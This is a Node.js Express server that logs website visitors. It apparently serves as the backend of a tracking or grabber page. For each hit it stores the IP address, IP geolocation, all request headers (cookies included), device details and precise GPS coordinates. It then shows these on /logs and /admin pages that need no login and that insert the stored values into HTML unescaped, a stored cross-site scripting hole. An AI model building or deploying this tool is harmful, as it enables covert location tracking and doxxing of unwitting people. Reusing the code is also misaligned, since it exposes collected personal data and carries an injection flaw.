const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
app.set('trust proxy', true);
app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const LOG = path.join(__dirname, 'visitors.jsonl');

// IP -> geo lookup
async function lookupGeo(ip) {
  try {
    const r = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
    return await r.json();
  } catch (_) {
    return {};
  }
}

app.post('/track', async (req, res) => {
  const fwd = (req.headers['x-forwarded-for'] || '').split(',')[0].trim();
  let ip = fwd || req.socket.remoteAddress || '';
  ip = ip.replace(/^::ffff:/, ''); // strip IPv6-mapped IPv4 prefix

  const geo = await lookupGeo(ip);

  const record = {
    time: new Date().toISOString(),
    ip,
    geo,
    headers: req.headers,
    body: req.body
  };

  try {
    fs.appendFileSync(LOG, JSON.stringify(record) + '\n');
  } catch (e) {
    console.error('log write failed:', e.message);
  }

  console.log(`[hit] ${record.time} ${ip} ${geo.city || '?'}, ${geo.country || '?'}`);
  res.json({ ok: true });
});

// Dump all logs as JSON
app.get('/logs', (req, res) => {
  try {
    const lines = fs.readFileSync(LOG, 'utf8').trim().split('\n').filter(Boolean);
    res.json(lines.map(l => JSON.parse(l)));
  } catch (_) {
    res.json([]);
  }
});

// Simple HTML viewer
app.get('/admin', (req, res) => {
  let rows = [];
  try {
    const lines = fs.readFileSync(LOG, 'utf8').trim().split('\n').filter(Boolean);
    rows = lines.map(l => JSON.parse(l)).reverse();
  } catch (_) {}

  const html = `<!DOCTYPE html><html><head><meta charset="utf-8">
  <title>Visitors</title>
  <style>
    body{font-family:system-ui;background:#0f172a;color:#e2e8f0;margin:0;padding:20px}
    h1{font-weight:300}
    table{border-collapse:collapse;width:100%;font-size:13px}
    th,td{border:1px solid #334155;padding:8px;text-align:left;vertical-align:top}
    th{background:#1e293b}
    tr:nth-child(even){background:#111827}
    .k{color:#94a3b8}
  </style></head><body>
  <h1>👀 ${rows.length} visitor${rows.length===1?'':'s'}</h1>
  <table><tr><th>Time</th><th>IP</th><th>Location</th><th>Device</th><th>GPS</th><th>Detail</th></tr>
  ${rows.map(r => {
    const b = r.body || {};
    const g = r.geo || {};
    const gps = b.gps ? `${b.gps.lat.toFixed(5)}, ${b.gps.lon.toFixed(5)} (±${Math.round(b.gps.accuracy)}m)` : '—';
    const dev = `${b.platform || '?'} • ${b.hardwareConcurrency || '?'} cores • ${b.deviceMemory || '?'}GB RAM`;
    const loc = [g.city, g.regionName, g.country].filter(Boolean).join(', ') || '—';
    return `<tr>
      <td>${new Date(r.time).toLocaleString()}</td>
      <td>${r.ip}</td>
      <td>${loc}</td>
      <td>${dev}</td>
      <td>${gps}</td>
      <td><details><summary>JSON</summary><pre>${JSON.stringify(r, null, 2)}</pre></details></td>
    </tr>`;
  }).join('')}
  </table></body></html>`;
  res.send(html);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('listening on ' + PORT));
